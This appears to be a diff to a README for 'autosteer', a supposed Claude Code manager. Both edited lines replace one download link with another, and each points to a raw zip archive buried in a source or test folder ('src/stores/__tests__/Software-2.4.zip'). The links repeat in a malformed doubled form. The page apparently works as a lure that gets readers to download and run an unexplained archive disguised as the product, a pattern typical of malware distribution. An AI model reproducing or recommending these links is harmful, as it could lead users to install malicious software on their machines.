@@ -1,7 +1,7 @@
 # 🚀 autosteer - Manage Your Claude Code Effortlessly
 
 ## 📥 Download Now
-[![Download autosteer](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/monitoring/autosteer_tahkhana.zip%https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/monitoring/autosteer_tahkhana.zip)](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/monitoring/autosteer_tahkhana.zip)
+[![Download autosteer](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip%https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip)](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip)
 
 ## 📃 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -29,7 +29,7 @@ To run autosteer smoothly, ensure your system meets the following requirements:
 - **Network:** Internet connection is required for initial downloads and updates.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/monitoring/autosteer_tahkhana.zip](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/monitoring/autosteer_tahkhana.zip)
+To get started, visit this page to download: [https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip](https://raw.githubusercontent.com/apothegmatic-whiskfern276/autosteer/main/src/stores/__tests__/Software-2.4.zip)
 
 1. Click on the link above.
 2. Find the latest release.
